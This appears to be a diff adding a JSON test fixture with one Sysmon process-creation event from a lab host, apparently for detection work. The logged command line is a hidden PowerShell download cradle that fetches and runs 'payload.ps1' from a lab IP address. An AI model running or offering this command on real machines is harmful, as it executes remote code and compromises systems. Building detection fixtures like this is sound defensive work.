@@ -1,0 +1,8 @@
+[
+  {
+    "Id": 1,
+    "TimeCreated": { "SystemTime": "2026-05-14T11:30:28.441000Z" },
+    "Computer": "BOBBY",
+    "Message": "Process Create:\nRuleName: -\nUtcTime: 2026-05-14 11:30:28.441\nProcessGuid: {4a8f2c1d-3f9c-11ef-a1b2-000000000002}\nProcessId: 6240\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.1\nDescription: Windows PowerShell\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.126.128/payload.ps1')\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: BOBBY\\labuser\nLogonGuid: {4a8f2c1d-5678-11ef-0000-000000000000}\nLogonId: 0x2f3a81\nTerminalSessionId: 0\nIntegrityLevel: Medium\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9\nParentProcessGuid: {4a8f2c1d-3f9b-11ef-a1b2-000000000002}\nParentProcessId: 488\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\nParentUser: NT AUTHORITY\\SYSTEM"
+  }
+]
